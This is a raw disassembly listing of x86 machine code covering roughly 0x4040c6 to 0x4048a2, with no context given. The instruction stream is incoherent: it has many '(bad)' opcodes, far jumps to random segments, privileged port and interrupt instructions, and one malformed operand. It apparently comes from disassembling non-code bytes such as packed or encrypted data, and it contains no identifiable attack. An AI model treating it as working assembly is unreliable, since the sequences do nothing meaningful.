  4040c6:	cmp    DWORD PTR ds:0x8180ecb6,esp
  4040cc:	sar    eax,0xeb
  4040cf:	pushf  
  4040d0:	mov    eax,ds:0x3b7fe066
  4040d5:	push   es
  4040d6:	mov    edx,0x51a305ec
  4040db:	and    edi,DWORD PTR [edx+esi*4]
  4040de:	call   0x6794:0xafbe7d58
  4040e5:	cdq    
  4040e6:	fild   DWORD PTR [ecx]
  4040e8:	dec    ebx
  4040e9:	hlt    
  4040ea:	loop   0x40412a
  4040ec:	sub    esi,ecx
  4040ee:	or     bh,BYTE PTR [ebx]
  4040f0:	push   ds
  4040f1:	jo     0x404105
  4040f3:	mov    edi,0xa476f243
  4040f8:	mov    ds:0x98571f3d,al
  4040fd:	sar    DWORD PTR [ebx-0x66],1
  404100:	lods   eax,DWORD PTR ds:[esi]
  404101:	mov    esp,0x145b8d84
  404106:	inc    ecx
  404107:	mov    ds,ebx
  404109:	jbe    0x404108
  40410b:	adc    DWORD PTR [edi+ebp*4],edx
  40410e:	repz call 0x4199:0xa5c3ec16
  404116:	xchg   ebp,eax
  404117:	jmp    0x550b:0xd3e82cff
  40411e:	pop    es
  40411f:	popf   
  404120:	dec    edx
  404121:	xor    eax,0x7ba96191
  404126:	(bad)  
  404127:	sti    
  404128:	and    BYTE PTR [esi-0x701ccb85],0x54
  40412f:	neg    ebx
  404131:	cmp    ch,BYTE PTR [esi-0x6]
  404134:	fs cmp eax,0x7576f118
  40413a:	mov    dh,0xa0
  40413c:	cld    
  40413d:	iret   
  40413e:	loopne 0x40419e
  404140:	jae    0x4040e0
  404142:	or     BYTE PTR [ebp-0x3b],ah
  404145:	repz add eax,DWORD PTR [edx-0x1a]
  404149:	xchg   ecx,eax
  40414a:	sbb    ch,bl
  40414c:	pusha  
  40414d:	xchg   ecx,eax
  40414e:	das    
  40414f:	push   0x1dae92c3
  404154:	add    eax,0xa22a38d0
  404159:	sbb    ecx,DWORD PTR [ebx+0x64]
  40415c:	stos   BYTE PTR es:[edi],al
  40415d:	mov    al,0x5e
  40415f:	pop    ecx
  404160:	adc    al,0x14
  404162:	xor    ecx,DWORD PTR [ecx-0x347672d8]
  404168:	cmp    BYTE PTR [ebx],0x70
  40416b:	arpl   WORD PTR [ebx-0x80],ax
  40416e:	rcl    DWORD PTR gs:[eax-0x22fd1e5a],0x85
  404176:	pop    esi
  404177:	cmp    ch,BYTE PTR [esi-0x8ba1628]
  40417d:	mov    ebx,DWORD PTR [ecx+eax*4+0x66]
  404181:	sbb    esp,DWORD PTR [ebx+esi*4+0x47b2275a]
  404188:	mov    bh,0xf9
  40418a:	inc    edx
  40418b:	test   edx,ecx
  40418d:	mov    ch,0x68
  40418f:	pop    ebp
  404190:	nop
  404191:	pop    ecx
  404192:	scas   eax,DWORD PTR es:[edi]
  404193:	lahf   
  404194:	push   ebp
  404195:	sbb    eax,0xa25c6e41
  40419a:	mov    esp,0xdc596e20
  40419f:	dec    ebx
  4041a0:	xchg   BYTE PTR [ebp+edi*2+0x57],dh
  4041a4:	fwait
  4041a5:	test   ebx,eax
  4041a7:	mov    esp,0xc0e17354
  4041ac:	push   ds
  4041ad:	bound  edi,QWORD PTR [ecx+eiz*2+0xa40c3c0]
  4041b4:	ja     0x40419c
  4041b6:	pop    esi
  4041b7:	xor    edx,DWORD PTR [edx+0x62104f6c]
  4041bd:	cli    
  4041be:	mov    esi,0x6511468c
  4041c3:	sbb    eax,0xade1f525
  4041c8:	fild   QWORD PTR [ecx-0x7521cf8]
  4041ce:	push   ebp
  4041cf:	jl     0x4041c5
  4041d1:	mov    DWORD PTR [ebx+0x5c910d04],edi
  4041d7:	xor    al,0x74
  4041d9:	rcl    DWORD PTR [esi+0x33],1
  4041dc:	sbb    al,0xb
  4041de:	mov    ds:0x5ca5e8bf,al
  4041e3:	int3   
  4041e4:	imul   ecx,edi,0xffffff8a
  4041e7:	iret   
  4041e8:	retf   
  4041e9:	push   cs
  4041ea:	ss inc ecx
  4041ec:	xor    ch,BYTE PTR [esp+ebx*2]
  4041ef:	stos   DWORD PTR es:[edi],eax
  4041f0:	sbb    al,0xaf
  4041f2:	stos   BYTE PTR es:[edi],al
  4041f3:	sbb    al,0x25
  4041f5:	rcl    dx,1
  4041f8:	jb     0x404190
  4041fa:	jle    0x4041a9
  4041fc:	cmp    DWORD PTR [eax],edx
  4041fe:	and    al,0xf4
  404200:	mov    edi,0xb439e792
  404205:	push   ss
  404206:	jmp    0xe284:0xeb4e8d2f
  40420d:	adc    bl,BYTE PTR [ebx-0x151dc013]
  404213:	jnp    0x4041f8
  404215:	pop    ebp
  404216:	sti    
  404217:	ins    BYTE PTR es:[edi],dx
  404218:	in     al,dx
  404219:	xchg   ecx,eax
  40421a:	sub    ebx,edi
  40421c:	je     0x404298
  40421e:	xor    eax,0xcc20c816
  404223:	mov    edi,es
  404225:	mov    bh,0xca
  404227:	and    eax,0xa1307d82
  40422c:	and    DWORD PTR [ebx-0x70],eax
  40422f:	scas   al,BYTE PTR es:[edi]
  404230:	test   DWORD PTR [ebx+0x6fa454d4],ecx
  404236:	dec    ecx
  404237:	div    BYTE PTR [edx*4-0xfea8237]
  40423e:	add    eax,0xdfb3a65b
  404243:	add    ebp,0x47cae13e
  404249:	pop    ebp
  40424a:	xchg   ebx,eax
  40424b:	lods   al,BYTE PTR ds:[esi]
  40424c:	sub    al,0x7e
  40424e:	imul   ebp,ecx,0x7d689272
  404254:	xchg   BYTE PTR [esi+eiz*8+0x246d4159],bh
  40425b:	and    al,0x95
  40425d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40425e:	or     dl,BYTE PTR [eax-0x7d02400]
  404264:	fsub   st(2),st
  404266:	in     eax,0x58
  404268:	jle    0x40425b
  40426a:	mov    ah,0xf9
  40426c:	jns    0x40426e
  40426e:	loopne 0x4042bf
  404270:	or     al,0xe5
  404272:	sub    al,0x8a
  404274:	sub    BYTE PTR [edi+ebx*8+0x7a],dl
  404278:	fwait
  404279:	dec    esp
  40427a:	mov    ch,BYTE PTR [edx+0x3e]
  40427d:	mov    ecx,esi
  40427f:	lock and DWORD PTR [ecx-0x6d580577],0x28f0ddba
  40428a:	pop    esp
  40428b:	fidivr WORD PTR [ebp+0x7c]
  40428e:	leave  
  40428f:	stc    
  404290:	jp     0x404292
  404292:	fwait
  404293:	jecxz  0x40424f
  404295:	jp     0x40425a
  404297:	mov    dh,0xda
  404299:	mov    edx,0x1aed642
  40429e:	sub    BYTE PTR [edx-0x279c55dc],dl
  4042a4:	imul   edx,DWORD PTR [ebp-0x2ffebe11],0x59
  4042ab:	call   0xbae7:0xa7dcb373
  4042b2:	popa   
  4042b3:	push   ss
  4042b4:	xor    DWORD PTR [ebp-0x61c00372],esp
  4042ba:	pushf  
  4042bb:	ins    BYTE PTR es:[edi],dx
  4042bc:	int3   
  4042bd:	out    0x8e,eax
  4042bf:	int    0x71
  4042c1:	imul   edi,DWORD PTR [edi-0x37],0xbd871288
  4042c8:	ins    BYTE PTR es:[edi],dx
  4042c9:	leave  
  4042ca:	sub    eax,0x5fca9da7
  4042cf:	add    DWORD PTR [edi+0x4e3f6f47],0x5890399
  4042d9:	ror    DWORD PTR [eax],1
  4042db:	in     eax,0x6d
  4042dd:	mov    dl,0xc8
  4042df:	loopne 0x404262
  4042e1:	cmp    al,0x6
  4042e3:	push   esi
  4042e4:	lods   eax,DWORD PTR ds:[esi]
  4042e5:	cdq    
  4042e6:	pop    ds
  4042e7:	jmp    0x1487:0x4d5e696a
  4042ee:	std    
  4042ef:	sbb    esi,DWORD PTR [ecx-0x70]
  4042f2:	mov    ds:0x8fa1b472,eax
  4042f7:	mov    eax,0xbf3cd381
  4042fc:	es sub edi,ecx
  4042ff:	or     ebp,ebx
  404301:	lock push es
  404303:	in     al,dx
  404304:	cmp    BYTE PTR [ecx],dh
  404306:	mov    ecx,0xd3e2ce19
  40430b:	pop    eax
  40430c:	adc    BYTE PTR [ecx],ch
  40430e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40430f:	imul   eax,DWORD PTR [esi-0x6],0x5c
  404313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404314:	mov    ecx,0x84e71465
  404319:	cmp    al,0x9b
  40431b:	cli    
  40431c:	test   al,0xe5
  40431e:	inc    edx
  40431f:	add    BYTE PTR [edi],ah
  404321:	pop    edi
  404322:	pop    esi
  404323:	mul    DWORD PTR [ecx-0x79]
  404326:	pop    ds
  404327:	mov    edi,0x9eb5cf8b
  40432c:	lahf   
  40432d:	loop   0x4042c1
  40432f:	inc    ebx
  404330:	sub    al,ah
  404332:	loop   0x404390
  404334:	mov    ebx,0x339526e2
  404339:	xchg   ecx,eax
  40433a:	jp     0x404316
  40433c:	sbb    al,0xa8
  40433e:	and    eax,0x8cae7a33
  404343:	fwait
  404344:	dec    edi
  404345:	test   BYTE PTR [esi+0x6d],al
  404348:	jge    0x404380
  40434a:	and    al,0xe3
  40434c:	push   ebx
  40434d:	jle    0x404390
  40434f:	or     edx,DWORD PTR [ebx+0xb]
  404352:	outs   dx,BYTE PTR ds:[esi]
  404353:	xlat   BYTE PTR ds:[ebx]
  404354:	push   ebp
  404355:	dec    ecx
  404356:	fnstsw WORD PTR [edi+0x64a9f53f]
  40435c:	sub    BYTE PTR [edi],dl
  40435e:	add    ebp,DWORD PTR [edx+0x4210266e]
  404364:	bound  ebx,QWORD PTR [ecx-0x24f8e8a8]
  40436a:	rcr    BYTE PTR [ecx],1
  40436c:	inc    edi
  40436d:	add    al,0x70
  40436f:	sub    ecx,DWORD PTR [ebp-0x2536eded]
  404375:	and    BYTE PTR [ecx-0x7697676f],0x7d
  40437c:	icebp  
  40437d:	pop    ecx
  40437e:	jmp    0x4043b2
  404380:	out    0x3,eax
  404382:	cmc    
  404383:	adc    eax,0x55d8ec17
  404388:	lods   eax,DWORD PTR ds:[esi]
  404389:	jp     0x404393
  40438b:	or     DWORD PTR [esi+0x198c031e],esi
  404391:	scas   eax,DWORD PTR es:[edi]
  404392:	retf   
  404393:	pop    esi
  404394:	lock addr16 cs push esp
  404398:	push   ss
  404399:	mov    al,0xa3
  40439b:	test   BYTE PTR [edi],dh
  40439d:	push   edx
  40439e:	add    eax,0x3bda2242
  4043a3:	xchg   ecx,eax
  4043a4:	daa    
  4043a5:	or     DWORD PTR [ebp+0x7b22bccb],eax
  4043ab:	ds cmp al,0xcf
  4043ae:	repnz mov eax,ds:0x2ca2671b
  4043b4:	xchg   BYTE PTR fs:[eax],cl
  4043b7:	ja     0x404428
  4043b9:	clc    
  4043ba:	sbb    eax,0x8919696c
  4043bf:	aam    0x4a
  4043c1:	fnstsw WORD PTR [ecx+0x11]
  4043c4:	imul   esi,DWORD PTR [edx],0x26
  4043c7:	and    BYTE PTR [edx+0x1f],dh
  4043ca:	mov    bl,0x1a
  4043cc:	fcmovu st,st(4)
  4043ce:	sub    esi,DWORD PTR [ebx+ebp*4+0x4a]
  4043d2:	jnp    0x404381
  4043d4:	retf   
  4043d5:	cmp    ebx,DWORD PTR [ebp+0x6b689ae5]
  4043db:	mov    edx,DWORD PTR [edi-0x70fd4615]
  4043e1:	sub    al,0x80
  4043e3:	leave  
  4043e4:	sahf   
  4043e5:	mov    ebx,0xb88b4ee7
  4043ea:	pushf  
  4043eb:	push   ebp
  4043ec:	jmp    0xc51f:0xab0e80a0
  4043f3:	pop    edi
  4043f4:	jbe    0x404468
  4043f6:	add    bh,BYTE PTR [ecx+0x39]
  4043f9:	call   DWORD PTR [ecx-0x55]
  4043fc:	imul   ebx,ecx,0xc975471a
  404402:	sbb    BYTE PTR [ecx],al
  404404:	out    0x9c,eax
  404406:	imul   eax,DWORD PTR [eax],0xaa0769ec
  40440c:	call   0x369f1550
  404411:	add    DWORD PTR [edi-0x151b57ff],edi
  404417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404418:	push   edi
  404419:	sbb    ebp,ebx
  40441b:	xchg   edx,eax
  40441c:	mov    al,ds:0x64d0e6b6
  404421:	jp     0x40442a
  404423:	xchg   edx,eax
  404424:	and    al,ah
  404426:	outs   dx,BYTE PTR ds:[esi]
  404427:	sub    ch,BYTE PTR [esi+0x7f]
  40442a:	add    BYTE PTR [ecx+0x3d],al
  40442d:	(bad)  
  40442e:	jo     0x404418
  404430:	in     eax,0xa7
  404432:	or     bl,al
  404434:	mov    al,0xcf
  404436:	cmp    al,0xa2
  404438:	mov    DWORD PTR [eax+0x45f61eb1],eax
  40443e:	test   al,dl
  404440:	sbb    al,0x58
  404442:	inc    esi
  404443:	je     0x404469
  404445:	mov    cl,BYTE PTR [edi-0x1]
  404448:	and    BYTE PTR [edx+0x13],0x5a
  40444c:	sbb    DWORD PTR [ecx+0x7c],0xffffffb4
  404450:	mov    ds:0x98211035,eax
  404455:	mov    DWORD PTR [edi],eax
  404457:	cmp    bl,BYTE PTR [eax+0xb0e8463]
  40445d:	(bad)  
  40445e:	sub    al,0xcd
  404460:	sub    eax,0xcfcd544d
  404465:	fcomp  st(6)
  404467:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404469:	inc    ebx
  40446a:	imul   eax,DWORD PTR [edx+0x2efe3176],0x50
  404471:	bound  eax,QWORD PTR [esi+edi*8+0x4d]
  404475:	(bad)  
  404476:	imul   ebp,ebp,0x2cefd200
  40447c:	sbb    DWORD PTR [edx+0x52],ecx
  40447f:	and    edi,DWORD PTR [esp+ebx*4+0x8032a7d]
  404486:	push   edi
  404487:	ins    DWORD PTR es:[di],dx
  404489:	popa   
  40448a:	mov    eax,ds:0x91ea92e9
  40448f:	jmp    0x40445d
  404491:	xor    DWORD PTR [ecx-0x39],eax
  404494:	pop    ebx
  404495:	xchg   BYTE PTR [edi-0xd],ah
  404498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404499:	jge    0x4044e0
  40449b:	scas   eax,DWORD PTR es:[edi]
  40449c:	mov    es,WORD PTR [ebx+0x1b]
  40449f:	fmul   QWORD PTR [edi+0x2e]
  4044a2:	jp     0x404508
  4044a4:	jecxz  0x404437
  4044a6:	jecxz  0x4044e9
  4044a8:	inc    esp
  4044a9:	push   ebp
  4044aa:	inc    esp
  4044ab:	repz pushf 
  4044ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ae:	and    DWORD PTR [eax-0x35],edx
  4044b1:	lock sub eax,0x962dd1f6
  4044b7:	mul    BYTE PTR [eax+0x3a6c5b8f]
  4044bd:	cmc    
  4044be:	test   DWORD PTR [edx-0x2],0x3763b0c5
  4044c5:	cmp    ch,dh
  4044c7:	das    
  4044c8:	xor    dl,ah
  4044ca:	mov    eax,0x5a41a1f7
  4044cf:	mov    eax,DWORD PTR [edi+0x782cf262]
  4044d5:	shl    DWORD PTR [ecx],1
  4044d7:	shl    BYTE PTR [esp+eax*1+0x265f4022],0x36
  4044df:	push   edi
  4044e0:	adc    BYTE PTR [ebp+0x56055aeb],ah
  4044e6:	test   al,0x3e
  4044e8:	push   ecx
  4044e9:	mov    ebx,0xecb32adc
  4044ee:	jecxz  0x40451d
  4044f0:	xchg   edx,eax
  4044f1:	push   ebp
  4044f2:	lahf   
  4044f3:	call   0x435e:0xe7e2b64c
  4044fa:	inc    ecx
  4044fb:	xlat   BYTE PTR ds:[ebx]
  4044fc:	sub    edi,DWORD PTR [esp+eiz*4+0x46a6869a]
  404503:	sub    BYTE PTR [eax-0x5],bl
  404506:	imul   ebx,eax,0x58e5fced
  40450c:	add    edi,eax
  40450e:	mov    WORD PTR [edx],?
  404510:	mov    ds:0x67671c2,eax
  404515:	or     DWORD PTR [edi],esp
  404517:	iret   
  404518:	fiadd  WORD PTR cs:[esi]
  40451b:	ja     0x404515
  40451d:	inc    ebx
  40451e:	sbb    eax,0xdaf77aee
  404523:	(bad)  
  404524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404525:	push   cs
  404526:	mov    ebx,0x848b0479
  40452b:	std    
  40452c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40452d:	mov    bh,0xdc
  40452f:	out    0x4a,eax
  404531:	cmp    al,0x8c
  404533:	pop    esp
  404534:	cdq    
  404535:	cmp    ebp,DWORD PTR [ebx+0x6d]
  404538:	xor    ch,dh
  40453a:	out    0xfc,eax
  40453c:	xchg   ebp,eax
  40453d:	mov    dh,0x8b
  40453f:	lods   eax,DWORD PTR ds:[esi]
  404540:	pop    esi
  404541:	add    BYTE PTR [ecx+0x24],bh
  404544:	ja     0x4045b1
  404546:	xor    al,0x61
  404548:	jb     0x4045bf
  40454a:	pop    ss
  40454b:	ds add ah,dh
  40454e:	in     eax,dx
  40454f:	sbb    al,0x23
  404551:	fbstp  TBYTE PTR [ecx+ebp*1-0x50]
  404555:	jne    0x40453b
  404557:	pop    esp
  404558:	call   0xef751520
  40455d:	mov    BYTE PTR [eax+0x1f05f20f],ah
  404563:	or     eax,0x8d05f92d
  404568:	in     al,0x46
  40456a:	pop    ebx
  40456b:	pop    ecx
  40456c:	retf   0x13d4
  40456f:	lahf   
  404570:	inc    edi
  404571:	fidivr DWORD PTR [esi+0x5]
  404574:	jge    0x4045b4
  404576:	sub    esi,eax
  404578:	dec    ebp
  404579:	test   eax,0x2db6eb83
  40457e:	or     ebp,DWORD PTR [eax+ecx*1-0x78f5aeb4]
  404585:	mov    cl,0xbf
  404587:	(bad)  
  404588:	mov    bl,0x22
  40458a:	push   ebx
  40458b:	(bad)  
  40458c:	sub    eax,0xe4472ca1
  404591:	jae    0x404559
  404593:	xchg   ecx,eax
  404594:	adc    bh,ch
  404596:	sbb    ecx,DWORD PTR [eax-0x71]
  404599:	enter  0x2a9f,0x4
  40459d:	jno    0x40454a
  40459f:	jmp    0x54a4:0xa0a7e111
  4045a6:	sbb    eax,0x717c94d5
  4045ab:	bound  ebx,QWORD PTR [eax-0x79af8169]
  4045b1:	aam    0xff
  4045b3:	pop    es
  4045b4:	cmp    DWORD PTR [edx*1-0x3b298f9e],esi
  4045bb:	inc    ebx
  4045bc:	adc    al,0xed
  4045be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045bf:	les    edx,FWORD PTR [edi-0x57]
  4045c2:	sub    al,0xb9
  4045c4:	outs   dx,BYTE PTR ds:[esi]
  4045c5:	mov    ah,0xa5
  4045c7:	xor    DWORD PTR [edx+ebp*4],edi
  4045ca:	xchg   BYTE PTR [eax-0xca9dc76],dh
  4045d0:	mov    WORD PTR ds:0xc8669bb3,es
  4045d6:	in     al,0xed
  4045d8:	and    al,0x7d
  4045da:	xchg   ecx,eax
  4045db:	jb     0x404568
  4045dd:	fstp   QWORD PTR [ebp+0x5f]
  4045e0:	mov    al,0xc1
  4045e2:	mov    al,0xb9
  4045e4:	icebp  
  4045e5:	clc    
  4045e6:	pop    esp
  4045e7:	mov    ch,0xf6
  4045e9:	mov    ch,0xfe
  4045eb:	popf   
  4045ec:	mov    ch,0x98
  4045ee:	pushf  
  4045ef:	sahf   
  4045f0:	sub    cl,BYTE PTR [ebp+0x303fefbb]
  4045f6:	xchg   edx,eax
  4045f7:	mov    ebp,0x7fbaa957
  4045fc:	(bad)  
  4045fd:	jmp    0x404622
  4045ff:	or     al,0x5c
  404601:	fdiv   QWORD PTR ds:0xe5276e3d
  404607:	inc    ebp
  404608:	scas   eax,DWORD PTR es:[edi]
  404609:	mov    WORD PTR [eax],es
  40460b:	add    BYTE PTR [ecx+esi*2-0x401372da],dl
  404612:	sub    dh,BYTE PTR ss:0xa9e217f0
  404619:	rol    BYTE PTR [ecx],cl
  40461b:	inc    edx
  40461c:	ins    BYTE PTR es:[edi],dx
  40461d:	aad    0xed
  40461f:	sub    eax,0x2e5faae5
  404624:	in     al,dx
  404625:	xchg   esi,eax
  404626:	mov    eax,DWORD PTR [edi-0x67]
  404629:	mov    bl,0xc
  40462b:	sub    ch,BYTE PTR [edx+0x2a6ab8f]
  404631:	cmp    edi,DWORD PTR [ebp+0x0]
  404634:	loope  0x40469f
  404636:	sbb    BYTE PTR [edx-0x529df65e],bl
  40463c:	adc    esp,ebx
  40463e:	lock inc esp
  404640:	dec    edi
  404641:	and    DWORD PTR [ecx-0x31],0xffffff95
  404645:	imul   esp,DWORD PTR [eax],0x17950370
  40464b:	jmp    0xfe26:0x2751ebac
  404652:	add    al,0x56
  404654:	xchg   edx,eax
  404655:	jbe    0x40460a
  404657:	aad    0x34
  404659:	push   ds
  40465a:	inc    edx
  40465b:	mov    ebp,DWORD PTR [ebx+edi*1-0x4aaae618]
  404662:	push   ebp
  404663:	pop    ds
  404664:	mov    dh,0x87
  404666:	inc    ebp
  404667:	cmp    eax,DWORD PTR [esi-0x1a]
  40466a:	push   esp
  40466b:	mov    ch,0x24
  40466d:	bound  esi,QWORD PTR [edx-0x75a41f35]
  404673:	retf   
  404674:	xchg   ebx,eax
  404675:	rol    DWORD PTR [eax-0x8],cl
  404678:	enter  0xe349,0x11
  40467c:	ins    BYTE PTR es:[edi],dx
  40467d:	xchg   ebp,eax
  40467e:	adc    al,0xc6
  404680:	mov    BYTE PTR es:[esi+edi*2],ch
  404684:	dec    ecx
  404685:	psubb  mm4,QWORD PTR ds:0xd5896854
  40468c:	sbb    esp,DWORD PTR [edx+0x48]
  40468f:	scas   al,BYTE PTR es:[edi]
  404690:	leave  
  404691:	pop    eax
  404692:	sub    al,0x22
  404694:	fwait
  404695:	call   0x1c25:0xed9d22f3
  40469c:	pushf  
  40469d:	cmp    BYTE PTR [eax],ah
  40469f:	int3   
  4046a0:	loope  0x40469e
  4046a2:	gs out dx,al
  4046a4:	push   cs
  4046a5:	adc    edx,edi
  4046a7:	adc    eax,0x758d2bbd
  4046ac:	adc    cl,BYTE PTR [ebp-0x7cea07b6]
  4046b2:	scas   eax,DWORD PTR es:[edi]
  4046b3:	cdq    
  4046b4:	(bad)  
  4046b5:	cli    
  4046b6:	adc    al,0x69
  4046b8:	add    eax,0x9c6e5bdd
  4046bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046be:	jle    0x4046cc
  4046c0:	jns    0x4046a4
  4046c2:	xchg   DWORD PTR [ebp-0x6169243d],ecx
  4046c8:	and    dh,BYTE PTR [esi-0x39]
  4046cb:	outs   dx,DWORD PTR ds:[esi]
  4046cc:	inc    esp
  4046cd:	mov    al,ds:0x572457ee
  4046d2:	jp     0x404745
  4046d4:	push   es
  4046d5:	mov    ebp,0xf2be0d2e
  4046da:	les    edx,FWORD PTR ds:0xf8b3e102
  4046e0:	popf   
  4046e1:	jo     0x4046a8
  4046e3:	pop    esi
  4046e4:	aaa    
  4046e5:	inc    eax
  4046e6:	push   0xffffffb7
  4046e8:	(bad)
  4046eb:	mov    ah,0x51
  4046ed:	mov    al,0xab
  4046ef:	neg    DWORD PTR [ecx-0x2a632231]
  4046f5:	pop    esp
  4046f6:	in     al,0x62
  4046f8:	and    ah,al
  4046fa:	jmp    0x3441:0x2983825f
  404701:	or     cl,BYTE PTR [ecx+0xe577531]
  404707:	pop    ebp
  404708:	lahf   
  404709:	dec    edx
  40470a:	xchg   edi,eax
  40470b:	or     eax,DWORD PTR [edi+eax*8+0x61]
  40470f:	push   edx
  404710:	xchg   esi,eax
  404711:	outs   dx,DWORD PTR ds:[esi]
  404712:	xor    ebx,DWORD PTR ss:[edi+0x78]
  404716:	sub    bh,BYTE PTR [edi-0x46beb4f4]
  40471c:	cs push ebx
  40471e:	xchg   ebp,eax
  40471f:	mov    esp,0x71be454a
  404724:	xor    esp,eax
  404726:	inc    esp
  404727:	jmp    0x4346ce56
  40472c:	jns    0x4046c5
  40472e:	mov    ecx,0x2c93863e
  404733:	idiv   BYTE PTR [edx+0x48]
  404736:	hlt    
  404737:	loop   0x404745
  404739:	ss push esi
  40473b:	xchg   ebp,eax
  40473c:	lock es mov ebx,0x74c80eb9
  404743:	ins    BYTE PTR es:[edi],dx
  404744:	loopne 0x40472b
  404746:	and    eax,0xa89d6f1
  40474b:	rol    bh,1
  40474d:	mov    ch,0x61
  40474f:	(bad)  
  404750:	mov    ds:0xf4906afe,eax
  404755:	sub    ecx,DWORD PTR [edi]
  404757:	outs   dx,DWORD PTR ds:[esi]
  404758:	or     al,BYTE PTR [eax-0x5d]
  40475b:	push   edx
  40475c:	ficomp DWORD PTR [esi+0x7868acda]
  404762:	nop
  404763:	or     dl,BYTE PTR [ebx+0x3b]
  404766:	imul   ecx,ebp,0xffffffa4
  404769:	ds dec edx
  40476b:	stos   DWORD PTR es:[edi],eax
  40476c:	lods   eax,DWORD PTR ds:[esi]
  40476d:	sub    DWORD PTR [ebp+0x29],edi
  404770:	push   0xc59b583c
  404775:	imul   edi,DWORD PTR [esi],0x12
  404778:	stc    
  404779:	imul   ebp,DWORD PTR [ebx],0xffffffc6
  40477c:	inc    esi
  40477d:	xchg   esi,eax
  40477e:	adc    eax,0xfe423c1d
  404783:	pusha  
  404784:	push   ds
  404785:	arpl   WORD PTR [ebp+edi*4-0x64],bx
  404789:	sub    BYTE PTR [ebx-0x7e6fe200],ah
  40478f:	addr16 out dx,eax
  404791:	jo     0x404766
  404793:	push   ebx
  404794:	cdq    
  404795:	(bad)  
  404796:	out    0xca,al
  404798:	push   eax
  404799:	dec    edx
  40479a:	imul   edi,ebp,0xffffffb2
  40479d:	dec    ebp
  40479e:	popa   
  40479f:	stc    
  4047a0:	or     DWORD PTR [esi],esp
  4047a2:	(bad)  
  4047a3:	jb     0x404806
  4047a5:	push   es
  4047a6:	mov    WORD PTR [edx],es
  4047a8:	jmp    0x2c8ccc0e
  4047ad:	xchg   ebp,eax
  4047ae:	stos   BYTE PTR es:[edi],al
  4047af:	ss ins BYTE PTR es:[edi],dx
  4047b1:	dec    ebp
  4047b2:	adc    al,0x97
  4047b4:	mov    dh,0xc4
  4047b6:	xchg   edx,eax
  4047b7:	adc    DWORD PTR [esi+0x26691f99],eax
  4047bd:	rcr    ch,cl
  4047bf:	jno    0x404831
  4047c1:	bound  esi,QWORD PTR [esi]
  4047c3:	out    dx,eax
  4047c4:	out    0x4f,al
  4047c6:	jae    0x4047a1
  4047c8:	xchg   al,bh
  4047ca:	iret   
  4047cb:	pop    ss
  4047cc:	adc    DWORD PTR [edx-0x38],edi
  4047cf:	lds    ecx,FWORD PTR [ecx+edi*8+0x70]
  4047d3:	jg     0x4047b3
  4047d5:	stos   BYTE PTR es:[edi],al
  4047d6:	ret    0x8210
  4047d9:	retf   
  4047da:	and    ebp,esi
  4047dc:	xchg   ebp,eax
  4047dd:	out    dx,eax
  4047de:	push   0x35
  4047e0:	inc    ebp
  4047e1:	jns    0x4047b2
  4047e3:	jmp    DWORD PTR ds:0x587aec94
  4047e9:	pusha  
  4047ea:	cdq    
  4047eb:	in     eax,dx
  4047ec:	icebp  
  4047ed:	ja     0x4047f8
  4047ef:	out    dx,al
  4047f0:	pop    esi
  4047f1:	or     BYTE PTR [esi],cl
  4047f3:	add    eax,0x655a0725
  4047f8:	inc    edi
  4047f9:	loopne 0x4047b1
  4047fb:	rcr    esi,cl
  4047fd:	adc    edi,esp
  4047ff:	xchg   esp,eax
  404800:	jo     0x404799
  404802:	push   0x58
  404804:	lods   al,BYTE PTR ds:[esi]
  404805:	xchg   esi,eax
  404806:	and    BYTE PTR [ebx-0x80],0xe9
  40480a:	iret   
  40480b:	retf   
  40480c:	fsubrp st(2),st
  40480e:	dec    esp
  40480f:	add    ebp,DWORD PTR es:[eax]
  404812:	jl     0x4047df
  404814:	mov    ss,WORD PTR [ecx]
  404816:	pusha  
  404817:	pop    ecx
  404818:	adc    esi,0x99dea302
  40481e:	lds    esp,FWORD PTR [edx+0x3a]
  404821:	inc    edx
  404822:	(bad)  
  404824:	mov    WORD PTR gs:[eax+0x7d],fs
  404828:	xchg   ebx,eax
  404829:	push   es
  40482a:	inc    edi
  40482b:	fs cli 
  40482d:	and    ebp,DWORD PTR [esi+0x70fa8300]
  404833:	out    0xdc,eax
  404835:	arpl   WORD PTR [ebx+0x1e986985],bx
  40483b:	cli    
  40483c:	stc    
  40483d:	xor    DWORD PTR [edi+0xe],0x1b
  404841:	cmp    al,0x6a
  404843:	inc    eax
  404844:	mov    eax,0x3ab9df07
  404849:	sti    
  40484a:	and    al,0xeb
  40484c:	adc    dl,BYTE PTR [esi+eax*8]
  40484f:	jg     0x4047e4
  404851:	aad    0xe8
  404853:	xor    BYTE PTR [edx-0x7],0x8a
  404857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404858:	xor    al,0x7c
  40485a:	add    al,0xd4
  40485c:	setne  BYTE PTR [ebx-0x4e]
  404860:	lock bound eax,QWORD PTR [ecx]
  404863:	out    0x63,al
  404865:	pop    ds
  404866:	jg     0x40487d
  404868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404869:	(bad)  
  40486a:	ds xchg esp,eax
  40486c:	lahf   
  40486d:	das    
  40486e:	sub    BYTE PTR [esp+edi*4],dh
  404871:	push   ebp
  404872:	jmp    0xabdce1c0
  404877:	test   BYTE PTR [ebx],bl
  404879:	push   cs
  40487a:	jnp    0x404876
  40487c:	loop   0x4048c2
  40487e:	jae    0x404808
  404880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404881:	call   DWORD PTR [ebp+0x10061a76]
  404887:	pop    eax
  404888:	es pop ebp
  40488a:	mov    ds:0xb4a55071,al
  40488f:	aam    0xb
  404891:	in     al,0x4f
  404893:	into   
  404894:	and    al,0x8e
  404896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404897:	mov    edx,0x1db4003e
  40489c:	cmp    al,BYTE PTR [ecx+0x4127ac12]
  4048a2:	mov    edi,es
